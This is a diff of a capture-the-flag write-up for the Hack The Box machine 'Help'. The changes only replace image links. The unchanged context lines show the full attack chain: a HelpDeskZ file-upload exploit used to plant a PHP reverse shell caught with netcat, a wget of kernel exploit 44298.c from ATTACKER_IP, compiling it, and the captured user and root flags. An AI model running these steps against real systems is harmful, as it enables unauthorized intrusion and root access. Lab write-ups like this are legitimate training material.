@@ -18,11 +18,11 @@ sudo nmap -p- --min-rate 5000 -sT -vvv $target
 sudo nmap -sC -sV -p 22,80,3000 -T4 $target
 ```
 
-<img width="480" height="270" alt="image" src="https://github.com/user-attachments/assets/a4615960-923b-41d7-b682-320d75d93cd8" />
+<img width="480" height="270" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="713" height="257" alt="image" src="https://github.com/user-attachments/assets/9abc13d5-64df-42e7-9647-b1d5bd603093" />
+<img width="713" height="257" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
-<img width="811" height="401" alt="image" src="https://github.com/user-attachments/assets/a1f454ce-c6c7-44f5-a9ba-40b69d1cef14" />
+<img width="811" height="401" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 
 **Discovered Services:**
@@ -32,22 +32,22 @@ sudo nmap -sC -sV -p 22,80,3000 -T4 $target
 
 ### Web Application Enumeration
 
-<img width="953" height="616" alt="image" src="https://github.com/user-attachments/assets/bc899ce3-5c64-4f0a-a078-762b6c6fb054" />
+<img width="953" height="616" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 
 ```bash
 # Add domain to hosts file
 echo "$target help.htb" | sudo tee -a /etc/hosts
 ```
-<img width="525" height="309" alt="image" src="https://github.com/user-attachments/assets/f923eee1-b1e6-4599-a68c-06f234e0cc6e" />
+<img width="525" height="309" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 ### Directory bruteforcing
 
-<img width="779" height="552" alt="image" src="https://github.com/user-attachments/assets/652701e9-e26f-43a9-b7c0-bf3fd05d4e1e" />
+<img width="779" height="552" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
-<img width="778" height="475" alt="image" src="https://github.com/user-attachments/assets/b7c950c0-6fda-4850-a516-c70ab4259f16" />
+<img width="778" height="475" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
-<img width="957" height="670" alt="image" src="https://github.com/user-attachments/assets/f4784b93-44a3-46df-adaa-f660f0c377ad" />
+<img width="957" height="670" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 **Key Discovery:** `/support` directory hosting HelpDeskZ application.
 
@@ -66,11 +66,11 @@ http://help.htb/support/readme.html
 searchsploit helpdeskz
 ```
 
-<img width="867" height="464" alt="image" src="https://github.com/user-attachments/assets/78ecbb67-cb20-47e6-b107-1351e2dfe9f5" />
+<img width="867" height="464" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Identified Exploit:** HelpDeskZ 1.0.2 - Arbitrary File Upload (ExploitDB ID: 40300)
 
-<img width="957" height="222" alt="image" src="https://github.com/user-attachments/assets/29176c88-623a-4232-b26a-60124dcb2414" />
+<img width="957" height="222" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
 ## Exploitation
 
@@ -81,16 +81,16 @@ searchsploit helpdeskz
 searchsploit -m 40300
 ```
 
-<img width="543" height="311" alt="image" src="https://github.com/user-attachments/assets/cb68c9a9-d7cf-4a4c-b432-10a3585ef238" />
+<img width="543" height="311" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 2. **Upload PHP reverse shell through the ticket submission form:**
 ```
 http://help.htb/support/?v=submit_ticket&action=displayForm
 ```
 
-<img width="1319" height="978" alt="image" src="https://github.com/user-attachments/assets/006c7997-a4ac-413d-bd66-81f0beeeaaf1" />
+<img width="1319" height="978" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
-<img width="1364" height="441" alt="image" src="https://github.com/user-attachments/assets/99d48310-5f7a-4d8a-964a-d4fa47cd83a1" />
+<img width="1364" height="441" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 3. **Execute the uploaded shell:**
 
@@ -106,9 +106,9 @@ nc -nlvp 9001
 curl http://help.htb/support/uploads/tickets/[GENERATED_HASH].php
 ```
 
-<img width="683" height="104" alt="image" src="https://github.com/user-attachments/assets/994be117-e18e-4656-9d06-86afef92c904" />
+<img width="683" height="104" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
-<img width="960" height="726" alt="image" src="https://github.com/user-attachments/assets/b87fbbd8-a859-446c-a2bf-d024fad28507" />
+<img width="960" height="726" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 ### Initial Access
 
@@ -121,7 +121,7 @@ cat /home/help/user.txt
 # c4a45fefa1e4dcd8ddcca8777ab9ffde
 ```
 
-<img width="323" height="82" alt="image" src="https://github.com/user-attachments/assets/7cd44cf4-1639-4873-a315-dba3ff0bc967" />
+<img width="323" height="82" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 ## Privilege Escalation
 
@@ -131,14 +131,14 @@ cat /home/help/user.txt
 uname -a
 # Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 ```
-<img width="873" height="83" alt="image" src="https://github.com/user-attachments/assets/b80feabf-0628-4948-876a-58c230a6c7f5" />
+<img width="873" height="83" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 
 ### Kernel Exploitation
 
 **Vulnerability:** Linux Kernel 4.4.0-116 Generic Privilege Escalation
 
-<img width="563" height="198" alt="image" src="https://github.com/user-attachments/assets/13779a48-56f9-48eb-9159-bfe6036e458f" />
+<img width="563" height="198" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 
 1. **Download and compile the exploit:**
@@ -152,7 +152,7 @@ wget http://ATTACKER_IP:8000/44298.c -O exploit.c
 gcc -o exploit exploit.c
 ```
 
-<img width="643" height="219" alt="image" src="https://github.com/user-attachments/assets/63b7c225-9238-473d-8054-fafcb4775f67" />
+<img width="643" height="219" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
 
 2. **Execute the exploit:**
@@ -171,9 +171,9 @@ cat /root/root.txt
 # 8df818bc2013e9b03c18234fdd0449b6
 ```
 
-<img width="960" height="459" alt="image" src="https://github.com/user-attachments/assets/37fa0f48-8da5-4d92-b70a-f59a204378c6" />
+<img width="960" height="459" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
-<img width="609" height="190" alt="image" src="https://github.com/user-attachments/assets/5792a17f-e3f7-4929-9f2c-fe1e1a9d6a98" />
+<img width="609" height="190" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-21-Upload-To-Imgur" />
 
 ## Technical Details
 
